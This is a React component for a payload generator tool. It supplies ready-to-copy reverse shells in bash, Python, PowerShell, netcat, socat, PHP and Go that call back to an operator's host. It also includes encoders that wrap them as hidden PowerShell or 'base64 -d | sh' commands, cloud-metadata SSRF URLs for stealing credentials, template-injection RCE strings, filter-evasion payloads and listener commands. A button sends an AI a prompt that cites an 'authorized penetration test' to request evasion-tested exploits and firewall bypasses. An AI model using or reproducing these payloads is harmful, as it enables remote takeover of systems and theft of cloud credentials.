import { useState, useMemo, useEffect } from 'react';
import {
  Terminal,
  Copy,
  Check,
  Sparkles,
  ShieldAlert,
  Flame,
  Globe,
  Radio,
} from 'lucide-react';
import styles from './PayloadCrafter.module.css';

interface PayloadCrafterProps {
  onSendToAI: (prompt: string) => void;
}

type PayloadCategory = 'shells' | 'ssrf' | 'ssti' | 'waf_cmd' | 'listeners';
type EncodingType = 'raw' | 'base64' | 'url' | 'hex';

const LHOST_STORAGE_KEY = 'nexus_security_lhost';
const LPORT_STORAGE_KEY = 'nexus_security_lport';

export default function PayloadCrafter({ onSendToAI }: PayloadCrafterProps) {
  const [lhost, setLhost] = useState(() => {
    return localStorage.getItem(LHOST_STORAGE_KEY) || '10.10.14.x';
  });
  const [lport, setLport] = useState(() => {
    return localStorage.getItem(LPORT_STORAGE_KEY) || '4444';
  });

  useEffect(() => {
    try {
      localStorage.setItem(LHOST_STORAGE_KEY, lhost);
    } catch (e) {
      console.error(e);
    }
  }, [lhost]);

  useEffect(() => {
    try {
      localStorage.setItem(LPORT_STORAGE_KEY, lport);
    } catch (e) {
      console.error(e);
    }
  }, [lport]);
  const [activeCategory, setActiveCategory] = useState<PayloadCategory>('shells');
  const [encoding, setEncoding] = useState<EncodingType>('raw');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const encodeString = (str: string, enc: EncodingType, type: 'bash' | 'powershell' | 'general' = 'general'): string => {
    if (enc === 'raw') return str;
    if (enc === 'url') return encodeURIComponent(str);
    if (enc === 'hex') {
      return Array.from(str)
        .map((c) => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'))
        .join('');
    }
    if (enc === 'base64') {
      if (type === 'powershell') {
        // UTF-16LE base64 for PowerShell
        const bytes = new Uint8Array(str.length * 2);
        for (let i = 0; i < str.length; i++) {
          const code = str.charCodeAt(i);
          bytes[i * 2] = code & 0xff;
          bytes[i * 2 + 1] = (code >> 8) & 0xff;
        }
        let binary = '';
        for (let i = 0; i < bytes.length; i++) {
          binary += String.fromCharCode(bytes[i]);
        }
        const b64 = btoa(binary);
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${b64}`;
      }
      if (type === 'bash') {
        const b64 = btoa(unescape(encodeURIComponent(str)));
        return `echo "${b64}" | base64 -d | sh`;
      }
      return btoa(unescape(encodeURIComponent(str)));
    }
    return str;
  };

  const reverseShells = useMemo(() => {
    return [
      {
        id: 'bash_i',
        name: 'Bash -i Interactive',
        type: 'bash' as const,
        payload: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
      },
      {
        id: 'bash_196',
        name: 'Bash Descriptor 196',
        type: 'bash' as const,
        payload: `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196`,
      },
      {
        id: 'python3',
        name: 'Python 3 Standard',
        type: 'general' as const,
        payload: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
      },
      {
        id: 'powershell_tcp',
        name: 'PowerShell TCP Client',
        type: 'powershell' as const,
        payload: `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
      },
      {
        id: 'nc_mkfifo',
        name: 'Netcat OpenBSD (mkfifo)',
        type: 'general' as const,
        payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
      },
      {
        id: 'nc_e',
        name: 'Netcat Traditional (-e)',
        type: 'general' as const,
        payload: `nc -e /bin/sh ${lhost} ${lport}`,
      },
      {
        id: 'socat',
        name: 'Socat TTY Shell',
        type: 'general' as const,
        payload: `socat tcp-connect:${lhost}:${lport} exec:/bin/sh,pty,stderr,setsid,sigint,sane`,
      },
      {
        id: 'php_fsockopen',
        name: 'PHP fsockopen',
        type: 'general' as const,
        payload: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      },
      {
        id: 'golang',
        name: 'Golang One-Liner',
        type: 'general' as const,
        payload: `echo 'package main;import"net";import"os/exec";func main(){c,_:=net.Dial("tcp","${lhost}:${lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
      },
    ];
  }, [lhost, lport]);

  const ssrfPayloads = [
    {
      id: 'aws_meta',
      name: 'AWS EC2 IAM Metadata (v1)',
      payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    },
    {
      id: 'aws_v2_token',
      name: 'AWS EC2 Token (v2 IMDS)',
      payload: `PUT http://169.254.169.254/latest/api/token (Header: X-aws-ec2-metadata-token-ttl-seconds: 21600)`,
    },
    {
      id: 'gcp_meta',
      name: 'GCP Compute Metadata (Flavor)',
      payload: 'http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google)',
    },
    {
      id: 'azure_meta',
      name: 'Azure Instance Metadata',
      payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Header: Metadata: true)',
    },
    {
      id: 'ip_decimal',
      name: '169.254.169.254 as Decimal Integer',
      payload: 'http://2852039166/',
    },
    {
      id: 'ip_hex',
      name: '169.254.169.254 as Hexadecimal',
      payload: 'http://0xa9.0xfe.0xa9.0xfe/',
    },
    {
      id: 'ip_octal',
      name: '169.254.169.254 as Octal Notation',
      payload: 'http://0251.0376.0251.0376/',
    },
    {
      id: 'ip_ipv6',
      name: '169.254.169.254 as IPv6 Mapped IPv4',
      payload: 'http://[::ffff:a9fe:a9fe]/',
    },
  ];

  const sstiPayloads = [
    {
      id: 'jinja2_popen',
      name: 'Jinja2 / Flask (Python RCE)',
      payload: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
    },
    {
      id: 'twig_filter',
      name: 'Twig (PHP Execution)',
      payload: `{{['id']|filter('system')}}`,
    },
    {
      id: 'freemarker_exec',
      name: 'Apache FreeMarker (Java Execute)',
      payload: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
    },
    {
      id: 'spring_spel',
      name: 'Spring Expression Language (SpEL)',
      payload: `\${T(java.lang.Runtime).getRuntime().exec("whoami")}`,
    },
    {
      id: 'ruby_erb',
      name: 'Ruby ERB / Rails',
      payload: `<%= system("whoami") %>`,
    },
  ];

  const wafBypasses = [
    {
      id: 'space_ifs',
      name: 'Space Bypass (${IFS})',
      payload: `cat\${IFS}/etc/passwd`,
    },
    {
      id: 'brace_expansion',
      name: 'Bash Brace Expansion Space Bypass',
      payload: `{cat,/etc/passwd}`,
    },
    {
      id: 'concat_quotes',
      name: 'String Concatenation / Evasion',
      payload: `c'a't /e't'c/p'a'sswd`,
    },
    {
      id: 'sqli_comment',
      name: 'SQLi Inline Comment Keyword Bypass',
      payload: `UN/**/ION SE/**/LECT 1,user(),version()--`,
    },
    {
      id: 'xss_svg',
      name: 'XSS Filter-Evasion (SVG)',
      payload: `<svg onload=alert(document.domain)>`,
    },
  ];

  const listeners = [
    {
      id: 'nc_listener',
      name: 'Netcat Verbose Listener',
      payload: `nc -lvnp ${lport}`,
    },
    {
      id: 'rlwrap_nc',
      name: 'Rlwrap (History & Arrow Keys)',
      payload: `rlwrap nc -lvnp ${lport}`,
    },
    {
      id: 'pwncat',
      name: 'Pwncat-CS (Auto PTY / Persistence)',
      payload: `pwncat-cs -lp ${lport}`,
    },
    {
      id: 'socat_listener',
      name: 'Socat Fully Interactive TTY Listener',
      payload: `socat file:\`tty\`,raw,echo=0 tcp-listen:${lport}`,
    },
  ];

  const handleCopy = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };

  const handleAIExploit = () => {
    const prompt = `I am performing an authorized penetration test. Help me craft and debug an exploit payload targeting:
- **Target Host/IP**: ${lhost}
- **Target Port**: ${lport}
- **Attack Category**: ${activeCategory.toUpperCase()}

Please provide:
1. Hardened and evasion-tested payloads for this context.
2. Step-by-step listener setup and execution sequence.
3. Troubleshooting steps if the shell fails to connect back (firewall bypass, egress ports e.g. 443/53).`;
    onSendToAI(prompt);
  };

  return (
    <div className={styles.payloadContainer}>
      {/* Top Configuration Strip */}
      <div className={styles.configStrip}>
        <div className={styles.inputGroup}>
          <span className={styles.inputLabel}>LHOST (IP):</span>
          <input
            className={styles.input}
            value={lhost}
            onChange={(e) => setLhost(e.target.value)}
            placeholder="10.10.14.x"
          />
        </div>

        <div className={styles.inputGroup}>
          <span className={styles.inputLabel}>LPORT:</span>
          <input
            className={styles.input}
            value={lport}
            onChange={(e) => setLport(e.target.value)}
            placeholder="4444"
            style={{ width: '80px' }}
          />
        </div>

        <div className={styles.inputGroup} style={{ marginLeft: 'auto' }}>
          <span className={styles.inputLabel}>Encoding:</span>
          <div className={styles.tabGroup}>
            {(['raw', 'base64', 'url', 'hex'] as const).map((enc) => (
              <button
                key={enc}
                className={`${styles.subTab} ${encoding === enc ? styles.active : ''}`}
                onClick={() => setEncoding(enc)}
              >
                {enc.toUpperCase()}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Categories Bar */}
      <div className={styles.topBar}>
        <div className={styles.tabGroup}>
          <button
            className={`${styles.subTab} ${activeCategory === 'shells' ? styles.active : ''}`}
            onClick={() => setActiveCategory('shells')}
          >
            <Terminal size={12} /> Reverse Shells
          </button>
          <button
            className={`${styles.subTab} ${activeCategory === 'listeners' ? styles.active : ''}`}
            onClick={() => setActiveCategory('listeners')}
          >
            <Radio size={12} /> Listeners
          </button>
          <button
            className={`${styles.subTab} ${activeCategory === 'ssrf' ? styles.active : ''}`}
            onClick={() => setActiveCategory('ssrf')}
          >
            <Globe size={12} /> SSRF & Cloud
          </button>
          <button
            className={`${styles.subTab} ${activeCategory === 'ssti' ? styles.active : ''}`}
            onClick={() => setActiveCategory('ssti')}
          >
            <Flame size={12} /> SSTI Matrix
          </button>
          <button
            className={`${styles.subTab} ${activeCategory === 'waf_cmd' ? styles.active : ''}`}
            onClick={() => setActiveCategory('waf_cmd')}
          >
            <ShieldAlert size={12} /> WAF Bypasses
          </button>
        </div>

        <button className={`${styles.btn} ${styles.btnPrimary}`} onClick={handleAIExploit}>
          <Sparkles size={13} /> Craft Exploit with AI
        </button>
      </div>

      {/* Grid of Payloads */}
      <div className={styles.grid}>
        {activeCategory === 'shells' &&
          reverseShells.map((item) => {
            const finalPayload = encodeString(item.payload, encoding, item.type);
            return (
              <div key={item.id} className={styles.payloadCard}>
                <div className={styles.cardHeader}>
                  <span className={styles.cardTitle}>
                    <Terminal size={14} color="#38bdf8" /> {item.name}
                  </span>
                  <button className={styles.btn} onClick={() => handleCopy(item.id, finalPayload)}>
                    {copiedId === item.id ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
                    {copiedId === item.id ? 'Copied' : 'Copy'}
                  </button>
                </div>
                <div className={styles.codeBox}>{finalPayload}</div>
              </div>
            );
          })}

        {activeCategory === 'listeners' &&
          listeners.map((item) => (
            <div key={item.id} className={styles.payloadCard}>
              <div className={styles.cardHeader}>
                <span className={styles.cardTitle}>
                  <Radio size={14} color="#34d399" /> {item.name}
                </span>
                <button className={styles.btn} onClick={() => handleCopy(item.id, item.payload)}>
                  {copiedId === item.id ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
                  {copiedId === item.id ? 'Copied' : 'Copy'}
                </button>
              </div>
              <div className={styles.codeBox}>{item.payload}</div>
            </div>
          ))}

        {activeCategory === 'ssrf' &&
          ssrfPayloads.map((item) => {
            const finalPayload = encodeString(item.payload, encoding);
            return (
              <div key={item.id} className={styles.payloadCard}>
                <div className={styles.cardHeader}>
                  <span className={styles.cardTitle}>
                    <Globe size={14} color="#fbbf24" /> {item.name}
                  </span>
                  <button className={styles.btn} onClick={() => handleCopy(item.id, finalPayload)}>
                    {copiedId === item.id ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
                    {copiedId === item.id ? 'Copied' : 'Copy'}
                  </button>
                </div>
                <div className={styles.codeBox}>{finalPayload}</div>
              </div>
            );
          })}

        {activeCategory === 'ssti' &&
          sstiPayloads.map((item) => {
            const finalPayload = encodeString(item.payload, encoding);
            return (
              <div key={item.id} className={styles.payloadCard}>
                <div className={styles.cardHeader}>
                  <span className={styles.cardTitle}>
                    <Flame size={14} color="#f87171" /> {item.name}
                  </span>
                  <button className={styles.btn} onClick={() => handleCopy(item.id, finalPayload)}>
                    {copiedId === item.id ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
                    {copiedId === item.id ? 'Copied' : 'Copy'}
                  </button>
                </div>
                <div className={styles.codeBox}>{finalPayload}</div>
              </div>
            );
          })}

        {activeCategory === 'waf_cmd' &&
          wafBypasses.map((item) => {
            const finalPayload = encodeString(item.payload, encoding);
            return (
              <div key={item.id} className={styles.payloadCard}>
                <div className={styles.cardHeader}>
                  <span className={styles.cardTitle}>
                    <ShieldAlert size={14} color="#c084fc" /> {item.name}
                  </span>
                  <button className={styles.btn} onClick={() => handleCopy(item.id, finalPayload)}>
                    {copiedId === item.id ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
                    {copiedId === item.id ? 'Copied' : 'Copy'}
                  </button>
                </div>
                <div className={styles.codeBox}>{finalPayload}</div>
              </div>
            );
          })}
      </div>
    </div>
  );
}
